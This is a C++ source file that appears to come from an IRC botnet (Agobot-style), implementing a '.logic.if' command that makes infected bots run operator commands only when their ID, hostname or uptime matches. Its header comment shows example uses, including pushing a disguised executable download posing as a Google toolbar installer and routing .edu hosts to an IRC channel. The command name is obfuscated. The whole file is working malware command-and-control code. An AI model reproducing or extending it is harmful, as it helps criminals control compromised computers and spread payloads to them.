/*

  [Afro's Logical Equasion]] 
  .logic.if TYPE MODE VALUE COMMAND
  	Example: .logic.if id != [4FR0]2.04 .http.update http://toolbar.google.com/installwin32.exe
	Example: .logic.if host == edu .irc.join #edus
	Example: .logic.if uptime > 7 .bot.sysinfo -n

*/

#include "main.h"
#include "mainctrl.h"
#include "logic.h"

void CLogic::Init(){

	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLogic, dp(12,15,7,9,3,79,9,6,0).CStr(),	this);

}
int UpDays();
bool CLogic::HandleCommand(CMessage *pMsg){

	if(!pMsg->sCmd.Compare(m_cmdLogic.sName.CStr())){
		int LogMode;
		CString LogType=pMsg->sChatString.Token(1, " ");
		CString LogModeS=pMsg->sChatString.Token(2, " ");
		CString LogVal=pMsg->sChatString.Token(3, " ");
		LogMode=pMsg->sChatString.Token(0, " ").GetLength()+LogVal.GetLength()+LogType.GetLength()+LogModeS.GetLength()+4;
		CString LogCmd=pMsg->sChatString.Mid(LogMode);

		CMessage *pLogic=pMsg;
		pLogic->sCmd=pMsg->sChatString.Token(4, " ").Mid(1);
		pLogic->sChatString=LogCmd;

		if(!LogModeS.Compare("!=")){LogMode=0;};
		if(!LogModeS.Compare("==")){LogMode=1;};
		if(!LogModeS.Compare(">")){LogMode=2;};
		if(!LogModeS.Compare("<")){LogMode=3;};

		if(!LogType.Compare("id")){
//			if(LogMode==2||LogMode==3)g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,pMsg->sDest , "[LOGIC] Greater/Lesser Than not supported for ID");
			if(LogMode==0&&g_cMainCtrl.m_cBot.bot_id.sValue.Compare(LogVal.CStr())) g_cMainCtrl.m_cBot.Recv(pLogic);
			else if(LogMode==1&&!g_cMainCtrl.m_cBot.bot_id.sValue.Compare(LogVal.CStr())) g_cMainCtrl.m_cBot.Recv(pLogic);
		}


		if(!LogType.Compare("host")){
//			if(LogMode==2||LogMode==3)g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,pMsg->sDest , "[LOGIC] Greater/Lesser Than not supported for Host");
			if(LogMode==0&&!g_cMainCtrl.m_cIRC.m_sLocalHost.Find(LogVal.CStr())) g_cMainCtrl.m_cBot.Recv(pLogic);
			else if(LogMode==1&&g_cMainCtrl.m_cIRC.m_sLocalHost.Find(LogVal.CStr())) g_cMainCtrl.m_cBot.Recv(pLogic);
		}


		else if(!LogType.Compare("uptime")){
	int Val=atoi(LogVal.CStr());//	char * pEnd;	int Val=strtol(Valy,&pEnd,0);	
	int Up=UpDays();

			if(LogMode==0&&Up!=Val) g_cMainCtrl.m_cBot.Recv(pLogic);
			if(LogMode==1&&Up==Val) g_cMainCtrl.m_cBot.Recv(pLogic);		
			if(LogMode==2&&Up>Val) g_cMainCtrl.m_cBot.Recv(pLogic);
			if(LogMode==3&&Up<Val) g_cMainCtrl.m_cBot.Recv(pLogic);
		}

	/*			else if(!LogType.Compare("speed")){
		int i = g_cMainCtrl.m_cSpeedTest.m_speedData.lTotalSpeed;
		if(!i) return false;
		
	int Val=atoi(LogVal.Str());
			if(LogMode==0&&i!=Val) g_cMainCtrl.m_cBot.Recv(pLogic);
			if(LogMode==1&&i==Val) g_cMainCtrl.m_cBot.Recv(pLogic);		
			if(LogMode==2&&i>Val) g_cMainCtrl.m_cBot.Recv(pLogic);
			if(LogMode==3&&i<Val) g_cMainCtrl.m_cBot.Recv(pLogic);
return true;
	}
*/
	}
	
	
return true; }


int UpDays(){int total=GetTickCount()/1000;return total/86400;}
